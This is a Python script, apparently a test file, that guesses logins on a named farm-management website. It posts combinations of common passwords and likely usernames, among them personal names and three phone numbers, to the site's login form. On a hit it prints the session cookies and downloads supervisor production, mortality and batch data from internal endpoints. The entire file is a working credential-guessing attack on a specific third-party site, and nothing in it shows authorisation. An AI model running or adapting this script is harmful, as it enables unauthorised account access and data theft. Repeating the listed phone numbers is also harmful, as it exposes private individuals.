"""
Test posting login credentials to https://sunfra.com/farm/sunfra/ index form directly.
"""
import requests, sys
sys.stdout.reconfigure(encoding='utf-8')

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
})

login_url = "https://sunfra.com/farm/sunfra/"

# Fetch initial page to get cookies
resp = session.get(login_url)
print("Initial page cookies:", session.cookies.get_dict())

passwords_to_try = ["Kusum@2026Bb!", "admin123", "sunfra123", "sunfra", "admin", "123456", "kusum2026", "Kusum@2026"]
usernames_to_try = ["admin", "sunfra", "farm", "supervisor", "kusum", "poornima", "yeswanth", "balaji", "prasad", "7259510983", "7975209680", "9493928388"]

found = False
for u in usernames_to_try:
    for p in passwords_to_try:
        data = {'username': u, 'password': p, 'remember_me': '1'}
        res = session.post(login_url, data=data)
        if "Invalid username or password" not in res.text:
            print(f"🎉 SUCCESSFUL LOGIN: username='{u}', password='{p}'")
            print("Session cookies after login:", session.cookies.get_dict())
            found = True
            
            # Fetch endpoints
            endpoints = [
                "https://sunfra.com/farm/sunfra/supervisor/supervisor_shead_mortality_json_to_web.php?date=2026-08-14",
                "https://sunfra.com/farm/sunfra/supervisor/supervisor_shead_production_json_to_web.php?date=2026-08-14",
                "https://sunfra.com/farm/sunfra/supervisor/supervisor_birds_weight_json_to_web.php?date=2026-08-14",
                "https://sunfra.com/farm/sunfra/batch/batch_json_to_web.php"
            ]
            for ep in endpoints:
                r = session.get(ep)
                print(f"\n--- {ep} ---")
                print("Status:", r.status_code)
                print("Content:\n", r.text[:500])
            break
    if found:
        break

if not found:
    print("❌ No matching credentials found.")

